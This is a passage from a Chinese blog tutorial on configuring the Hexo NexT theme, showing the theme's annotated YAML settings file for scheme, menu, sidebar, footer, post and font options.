<p>这是传统的方式。最新版的 NexT 和 Hexo 支持“Alternate Theme Config”，即通过修改根目录下的 <code>_config.[name].yml</code> （<code>_config.next.yml</code>）文件来配置主题。Hexo 官方已实现此功能，在升级到 Hexo 5.0 版本后，请留意配置方式上的改变，使用 <code>_config.next.yml</code> 代替 <code>source/_data/next.yml</code>。旧的 <code>next.yml</code> 配置方式诞生于 2015 年（<a href="https://github.com/iissnan/hexo-theme-next/issues/328">iissnan/hexo-theme-next#328</a>），已经完成其历史使命，将在 NexT v8.1.0 版本后停止支持。详细请参考 <a href="https://theme-next.js.org/docs/getting-started/configuration.html">NexT 官方文档 1</a>、<a href="https://theme-next.js.org/docs/getting-started/configuration.html">NexT 官方文档 2</a>。</p>
<p>打开“主题配置文件”，参考自 <a href="https://theme-next.js.org/docs/theme-settings/sidebar.html">NexT 官方文档 - 配置</a>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"><span class="comment"># It&#x27;s recommended to use Alternate Theme Config to configure NexT</span></span><br><span class="line"><span class="comment"># Modifying this file may result in merge conflict</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/getting-started/configuration</span></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Theme Core Configuration Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow to cache content generation. 缓存内容生成</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove unnecessary files after hexo generate. 移除不需要的文件</span></span><br><span class="line"><span class="attr">minify:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define custom file paths. 自定义样式布局，你可以对以下十个部分进行私人定制。这是新版本的新功能，旧版本需要自行修改原有的主题内部文件，所以搜索引擎查到的有些高级功能的实现还是“老方法”。更新此功能更易于管理，且不易出错。配合 Chrome 的调试功能，可以实现对界面的完全改造。NexT 建议使用新方法，不提倡修改主题内部文件的旧方法，请谨慎甄别，因为其内容可能过时。</span></span><br><span class="line"><span class="comment"># Create your custom files in site directory `source/_data` and uncomment needed files below.</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings 主题方案设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes 选一个方案，我的是 Mist</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dark Mode 深色模式，auto 为自动，true 为常开</span></span><br><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Site Information Settings 网站信息设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">favicon:</span> <span class="comment"># 网站的图标设置，文件在主题文件夹 source 里</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom Logo (Warning: Do not support scheme Mist)</span></span><br><span class="line"><span class="attr">custom_logo:</span> <span class="comment">#/uploads/custom-logo.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># See: https://creativecommons.org/about/cclicenses/</span></span><br><span class="line"><span class="comment"># Available values of license: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span></span><br><span class="line"><span class="comment"># You can set a language value if you prefer a translated version of CC license, e.g. deed.zh</span></span><br><span class="line"><span class="comment"># CC licenses are available in 39 languages, you can find the specific and correct abbreviation you need on https://creativecommons.org</span></span><br><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">language:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings 菜单设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: `Key: /link/ || icon`</span></span><br><span class="line"><span class="comment"># Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-senstive.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="comment"># External url should start with http:// or https://</span></span><br><span class="line"><span class="attr">menu:</span> <span class="comment"># 一级目录设置，多级目录不常用，其设置见官方文档</span></span><br><span class="line">  <span class="comment">#home: / || fa fa-home # 主界面菜单，某一旧版本在此处出现了 bug，原因是/和||之间的空格，新版本只需注意图标名称与旧版本不同，下面的同理</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user # 关于菜单</span></span><br><span class="line">  <span class="comment">#tags: /tags/ || fa fa-tags # 标签菜单，如果文章带有标签，建议打开，并 hexo new page tags，在根目录下的 source 文件夹中生成了对应名称的文件夹，在其中的 index.md 添加 type: &quot;tags&quot;，下面的同理</span></span><br><span class="line">  <span class="comment">#categories: /categories/ || fa fa-th # 分类菜单</span></span><br><span class="line">  <span class="comment">#archives: /archives/ || fa fa-archive # 归档菜单，可以打开</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges. 图标</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Sidebar Settings 侧边栏设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/sidebar</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position. 侧边栏位置</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="comment">#position: right</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Manual define the sidebar width. If commented, will be default for:</span></span><br><span class="line">  <span class="comment"># Muse | Mist: 320</span></span><br><span class="line">  <span class="comment"># Pisces | Gemini: 240</span></span><br><span class="line">  <span class="comment">#width: 300</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display (only for Muse | Mist), available values:</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default. 在文章中打开侧边栏</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically. 常开</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon. 常隐藏</span></span><br><span class="line">  <span class="comment">#  - remove  totally remove sidebar including sidebar toggle. 移除</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar padding in pixels. 不用改</span></span><br><span class="line">  <span class="attr">padding:</span> <span class="number">18</span></span><br><span class="line">  <span class="comment"># Sidebar offset from top menubar in pixels (only for Pisces | Gemini).</span></span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span></span><br><span class="line">  <span class="comment"># Enable sidebar on narrow view (only for Muse | Mist). 窄屏幕（手机）是否显示侧边栏</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar 侧边栏头像，和上面的头像一样，注意文件的路径和名称，还有扩展名</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="comment">#/images/avatar.gif</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle. 圆的？</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor. 旋转的？（焦点移到上面会旋转）</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Posts / Categories / Tags in sidebar.</span></span><br><span class="line"><span class="attr">site_state:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links 社交账号</span></span><br><span class="line"><span class="comment"># Usage: `Key: permalink || icon`</span></span><br><span class="line"><span class="comment"># Key is the link label showing to end users.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="comment">#GitHub: https://github.com/yourname || fab fa-github</span></span><br><span class="line">  <span class="comment">#E-Mail: mailto:yourname@gmail.com || fa fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_settings:</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-globe</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Links</span></span><br><span class="line">  <span class="comment"># Available values: block | inline</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">block</span></span><br><span class="line"></span><br><span class="line"><span class="attr">links:</span> <span class="comment"># 链接，可以用来添加友链</span></span><br><span class="line">  <span class="comment">#Title: http://yoursite.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table of Contents in the Sidebar 侧边栏中的文章目录</span></span><br><span class="line"><span class="comment"># Front-matter variable (unsupport wrap expand_all).</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc. 是否编号</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If true, all words will placed on next lines if header width longer then sidebar width. 标题字数太多怎么办</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, all level of TOC in a post will be displayed, rather than the activated part of it. 次级标题是否一直展开</span></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Maximum heading depth of generated toc. 标题最大层数</span></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A button to open designated chat widget in sidebar. 聊天？</span></span><br><span class="line"><span class="comment"># Firstly, you need enable the chat service you want to activate its sidebar button.</span></span><br><span class="line"><span class="attr">chat:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#service: chatra</span></span><br><span class="line">  <span class="comment">#service: tidio</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-comment</span> <span class="comment"># Icon name in Font Awesome, set false to disable icon.</span></span><br><span class="line">  <span class="attr">text:</span> <span class="string">Chat</span> <span class="comment"># Button text, change it as you wish.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Footer Settings 页脚设置，8.0 新增</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/footer</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show multilingual switcher in footer.</span></span><br><span class="line"><span class="attr">language_switcher:</span> <span class="literal">false</span> <span class="comment"># 页脚的语言切换</span></span><br><span class="line"></span><br><span class="line"><span class="attr">footer:</span> <span class="comment"># 页脚设置</span></span><br><span class="line">  <span class="comment"># Specify the date when the site was setup. If not defined, current year will be used.</span></span><br><span class="line">  <span class="comment">#since: 2020 # 网站建立日期</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info. since 和版权之间的图标</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="comment"># Icon name in Font Awesome. See: https://fontawesome.com/icons</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span> <span class="comment"># Font Awesome 中的图标名，这一点和旧版本不一样</span></span><br><span class="line">    <span class="comment"># If you want to animate the icon, set it to true.</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span> <span class="comment"># 动态效果，某一版本新增的功能</span></span><br><span class="line">    <span class="comment"># Change the color of icon, using Hex Code.</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#ff0000&quot;</span> <span class="comment"># 图标颜色</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, `author` from Hexo `_config.yml` will be used.</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="comment"># 显示版权的名字</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">true</span> <span class="comment"># 是否显示 Powered by Hexo &amp; NexT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Beian ICP and gongan information for Chinese users. See: https://beian.miit.gov.cn, http://www.beian.gov.cn 备案信息</span></span><br><span class="line">  <span class="attr">beian:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">icp:</span></span><br><span class="line">    <span class="comment"># The digit in the num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_id:</span></span><br><span class="line">    <span class="comment"># The full num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_num:</span></span><br><span class="line">    <span class="comment"># The icon for gongan beian. See: http://www.beian.gov.cn/portal/download</span></span><br><span class="line">    <span class="attr">gongan_icon_url:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Post Settings 文章发布设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/posts</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text. 文章简介</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read more button 阅读更多按钮</span></span><br><span class="line"><span class="comment"># If true, the read more button will be displayed in excerpt section.</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post meta display settings 文章元数据，即每篇文章的基本信息</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">updated_at:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">another_day:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post wordcount display settings 字数统计</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-word-counter 依赖的插件，具体参考插件说明</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use icon instead of the symbol # to indicate the tag at the bottom of the post 显示标签用图标还是 # 号</span></span><br><span class="line"><span class="attr">tag_icon:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Donate (Sponsor) settings 要钱</span></span><br><span class="line"><span class="comment"># Front-matter variable (unsupport animation).</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># If true, a donate button will be displayed in every article by default.</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Buy me a coffee 要钱时说什么</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span> <span class="comment"># 要钱方式，注意文件路径、文件名和扩展名</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Subscribe through Telegram Channel, Twitter, etc. 诱导关注</span></span><br><span class="line"><span class="comment"># Usage: `Key: permalink || icon` (Font Awesome)</span></span><br><span class="line"><span class="attr">follow_me:</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/username || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#Telegram: https://t.me/channel_name || fab fa-telegram</span></span><br><span class="line">  <span class="comment">#WeChat: /images/wechat_channel.jpg || fab fa-weixin</span></span><br><span class="line">  <span class="comment">#RSS: /atom.xml || fa fa-rss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Related popular posts 相关文章</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/tea3/hexo-related-popular-posts 依赖的插件</span></span><br><span class="line"><span class="attr">related_posts:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">title:</span> <span class="comment"># Custom header, leave empty to use the default one</span></span><br><span class="line">  <span class="attr">display_in_home:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">    <span class="attr">maxCount:</span> <span class="number">5</span></span><br><span class="line">    <span class="comment">#PPMixingRate: 0.0</span></span><br><span class="line">    <span class="comment">#isDate: false</span></span><br><span class="line">    <span class="comment">#isImage: false</span></span><br><span class="line">    <span class="comment">#isExcerpt: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post edit 文章在线编辑</span></span><br><span class="line"><span class="comment"># Easily browse and edit blog source code online.</span></span><br><span class="line"><span class="attr">post_edit:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name</span> <span class="comment"># Link for view source</span></span><br><span class="line">  <span class="comment">#url: https://github.com/user-name/repo-name/edit/branch-name/subdirectory-name # Link for fork &amp; edit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show previous post and next post in post footer if exists</span></span><br><span class="line"><span class="comment"># Available values: left | right | false</span></span><br><span class="line"><span class="attr">post_navigation:</span> <span class="string">left</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Custom Page Settings 个性化设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/custom-pages</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TagCloud settings for tags page. 标签云</span></span><br><span class="line"><span class="attr">tagcloud:</span></span><br><span class="line">  <span class="attr">min:</span> <span class="number">12</span> <span class="comment"># Minimun font size in px 最小的</span></span><br><span class="line">  <span class="attr">max:</span> <span class="number">30</span> <span class="comment"># Maxium font size in px 最大的</span></span><br><span class="line">  <span class="attr">amount:</span> <span class="number">200</span> <span class="comment"># Total amount of tags 最多有多少</span></span><br><span class="line">  <span class="attr">orderby:</span> <span class="string">name</span> <span class="comment"># Order of tags</span></span><br><span class="line">  <span class="attr">order:</span> <span class="number">1</span> <span class="comment"># Sort order</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Calendar 谷歌日历</span></span><br><span class="line"><span class="comment"># Share your recent schedule to others via calendar page.</span></span><br><span class="line"><span class="attr">calendar:</span></span><br><span class="line">  <span class="attr">calendar_id:</span> <span class="string">&lt;required&gt;</span> <span class="comment"># Your Google account E-Mail</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line">  <span class="attr">orderBy:</span> <span class="string">startTime</span></span><br><span class="line">  <span class="attr">offsetMax:</span> <span class="number">24</span> <span class="comment"># Time Range</span></span><br><span class="line">  <span class="attr">offsetMin:</span> <span class="number">4</span> <span class="comment"># Time Range</span></span><br><span class="line">  <span class="attr">showDeleted:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">singleEvents:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">maxResults:</span> <span class="number">250</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Misc Theme Settings 其他主题设置</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/theme-settings/miscellaneous</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Preconnect CDN for fonts and plugins.</span></span><br><span class="line"><span class="comment"># For more information: https://www.w3.org/TR/resource-hints/#preconnect</span></span><br><span class="line"><span class="attr">preconnect:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the text alignment in posts / pages. 不用改</span></span><br><span class="line"><span class="attr">text_align:</span></span><br><span class="line">  <span class="comment"># Available values: start | end | left | right | center | justify | justify-all | match-parent</span></span><br><span class="line">  <span class="attr">desktop:</span> <span class="string">justify</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="string">justify</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reduce padding / margin indents on devices with narrow width. 不用改</span></span><br><span class="line"><span class="attr">mobile_layout_economy:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Android Chrome header panel color ($brand-bg / $headband-bg =&gt; $black-deep).</span></span><br><span class="line"><span class="attr">android_chrome_color:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="comment"># Code Highlight theme 代码块主题</span></span><br><span class="line">  <span class="comment"># All available themes: https://theme-next.js.org/highlight/</span></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">tomorrow-night</span></span><br><span class="line">  <span class="attr">prism:</span></span><br><span class="line">    <span class="attr">light:</span> <span class="string">prism</span></span><br><span class="line">    <span class="attr">dark:</span> <span class="string">prism-dark</span></span><br><span class="line">  <span class="comment"># Add copy button on codeblock 代码块复制按钮</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Available values: default | flat | mac 风格</span></span><br><span class="line">    <span class="attr">style:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span> <span class="comment"># 回顶键</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reading progress bar 页面浏览进度条</span></span><br><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Available values: top | bottom</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#37c6c0&quot;</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">3px</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bookmark Support 书签，记录页面浏览进度</span></span><br><span class="line"><span class="attr">bookmark:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Customize the color of the bookmark.</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="comment"># If auto, save the reading progress when closing the page or clicking the bookmark-icon.</span></span><br><span class="line">  <span class="comment"># If manual, only save it by clicking the bookmark-icon.</span></span><br><span class="line">  <span class="attr">save:</span> <span class="string">auto</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># `Follow me on GitHub` banner in the top-right corner. 右上角 GitHub 图标</span></span><br><span class="line"><span class="attr">github_banner:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">permalink:</span> <span class="string">https://github.com/yourname</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Follow</span> <span class="string">me</span> <span class="string">on</span> <span class="string">GitHub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Font Settings 字体设置</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Find fonts on Google Fonts (https://www.google.com/fonts)</span></span><br><span class="line"><span class="comment"># All fonts set here will have the following styles:</span></span><br><span class="line"><span class="comment">#   light | light italic | normal | normal italic | bold | bold italic</span></span><br><span class="line"><span class="comment"># Be aware that setting too much fonts will cause site running slowly</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Web Safe fonts are recommended for `global` (and `title`):</span></span><br><span class="line"><span class="comment"># Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host, e.g. https://fonts.googleapis.com (Default).</span></span><br><span class="line">  <span class="attr">host:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font options:</span></span><br><span class="line">  <span class="comment"># `external: true` will load this font family from `host` above.</span></span><br><span class="line">  <span class="comment"># `family: Times New Roman`. Without any quotes.</span></span><br><span class="line">  <span class="comment"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used for all elements inside 